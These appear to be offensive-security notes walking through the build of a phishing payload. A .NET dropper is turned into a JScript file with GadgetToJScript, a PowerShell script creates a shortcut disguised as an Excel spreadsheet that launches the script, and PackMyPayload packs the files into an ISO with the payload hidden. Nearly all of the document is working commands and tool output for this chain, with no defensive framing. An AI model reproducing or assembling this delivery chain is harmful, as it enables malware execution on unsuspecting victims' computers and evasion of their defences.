

Use process hollowing and embed bin file 



```python
PS C:\Users\Attacker> C:\Tools\GadgetToJScript\GadgetToJScript\bin\Release\GadgetToJScript.exe -a C:\Payloads\deals\Mydropper\Mydropper\bin\Release\Mydropper.dll -w js -b -o C:\Payloads\deals
[+]: Generating the js payload
[+]: First stage gadget generation done.
[+]: Loading your .NET assembly:C:\Payloads\deals\Mydropper\Mydropper\bin\Release\Mydropper.dll
[+]: Second stage gadget generation done.
[*]: Payload generation completed, check: C:\Payloads\deals.js
```




create a xlsx file and just add any dummy data


```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\deals\deals.xlsx.lnk")
$lnk.TargetPath = "%COMSPEC%"
$lnk.Arguments = "/C start deals.xlsx && wscript deals.js"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()

```


```python
attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker$ python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,deals.js /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.3.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning files onto ISO:
    Adding file: /deals.js
    Adding file: /deals.xlsx
    Adding file: /deals.xlsx.lnk
    Adding file: /~$deals.xlsx
    Hiding file: //deals.xlsx
    Hiding file: //deals.js
[+] File packed into ISO.

[+] Generated file written to (size: 571392): /mnt/c/Payloads/deals/deals.iso
```